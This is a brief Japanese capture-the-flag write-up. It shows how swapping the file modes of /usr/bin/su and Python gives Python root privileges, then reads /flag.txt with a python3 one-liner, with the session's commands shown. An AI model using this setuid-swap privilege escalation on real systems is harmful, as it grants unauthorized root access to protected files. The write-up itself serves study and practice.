`/usr/bin/su`と`/usr/local/bin/python`の権限を入れ替え、Pythonを`root`権限で動かせるようにする。

その後、Pythonを使ってフラグを読み取り、その内容を`print`すればよい。

```
Enter two paths. I will swap the file modes of A and B.
A> /usr/bin/su
B> /usr/local/bin/python
sh: 0: can't access tty; job control turned off
$ python3 -c 'print(open("/flag.txt").read())'
```